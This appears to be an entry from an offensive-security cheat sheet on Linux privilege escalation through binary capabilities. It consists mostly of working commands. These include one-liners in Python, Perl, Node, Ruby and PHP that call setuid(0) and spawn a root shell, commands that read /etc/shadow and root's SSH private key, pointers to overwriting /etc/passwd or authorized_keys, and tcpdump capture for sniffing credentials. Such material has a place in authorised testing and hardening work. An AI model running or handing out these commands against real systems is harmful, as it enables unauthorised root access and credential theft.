---
description: |
  Exploit Linux capabilities assigned to binaries to escalate privileges. Capabilities like cap_setuid allow setting UID to root without SUID bit.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Find binaries with capabilities
      # ============================================================

      # Enumerate all binaries with capabilities recursively
      getcap -r / 2>/dev/null

      # ============================================================
      # cap_setuid — Set UID to 0 (root) and spawn shell
      # ============================================================

      # --- cap_setuid on Python ---
      # If: /usr/bin/python3 = cap_setuid+ep
      /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

      # --- cap_setuid on Perl ---
      # If: /usr/bin/perl = cap_setuid+ep
      /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

      # --- cap_setuid on Node ---
      # If: /usr/bin/node = cap_setuid+ep
      /usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'

      # --- cap_setuid on Ruby ---
      # If: /usr/bin/ruby = cap_setuid+ep
      /usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

      # --- cap_setuid on PHP ---
      # If: /usr/bin/php = cap_setuid+ep
      /usr/bin/php -r 'posix_setuid(0); system("/bin/bash");'

      # ============================================================
      # cap_dac_read_search — Read any file on the system
      # ============================================================

      # If: /usr/bin/tar = cap_dac_read_search+ep
      /usr/bin/tar czf /tmp/shadow.tar.gz /etc/shadow
      tar xzf /tmp/shadow.tar.gz
      cat etc/shadow

      # If: /usr/bin/cat = cap_dac_read_search+ep
      /usr/bin/cat /etc/shadow
      /usr/bin/cat /root/.ssh/id_rsa

      # ============================================================
      # cap_dac_override — Write any file on the system
      # ============================================================

      # If a binary has cap_dac_override, it can write to any file
      # Use this to overwrite /etc/passwd or /etc/shadow
      # or write an SSH key to /root/.ssh/authorized_keys

      # ============================================================
      # cap_net_raw — Packet capture (credential sniffing)
      # ============================================================

      # If: /usr/bin/tcpdump = cap_net_raw+ep
      tcpdump -i any -w /tmp/capture.pcap
      # Analyze for cleartext credentials (FTP, HTTP, Telnet, etc.)

      # If: /usr/bin/python3 = cap_net_raw+ep
      # Can use scapy for packet sniffing
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Capability_Abuse
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
  - https://gtfobins.github.io/
---
